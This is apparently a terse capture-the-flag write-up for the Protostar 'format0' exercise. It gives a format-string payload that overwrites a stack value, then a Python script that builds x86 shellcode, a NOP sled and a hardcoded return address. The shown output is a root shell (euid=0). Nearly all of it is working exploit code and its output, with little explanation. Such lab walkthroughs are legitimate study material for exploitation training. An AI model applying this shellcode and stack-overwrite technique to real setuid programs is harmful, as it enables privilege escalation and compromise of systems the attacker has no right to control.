# format0

## solution
```
user@protostar:/opt/protostar/bin$ ./format0 $(python -c 'print "%64s\xef\xbe\xad\xde"')
you have hit the target correctly :)
```

## shell
```py
import struct

pad = '%80s'

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' 

nop = '\x90' * 32

ret = struct.pack('I', 0xbffff730 + 0x50)

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ ./format0 $(python /tmp/pwn.py)
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
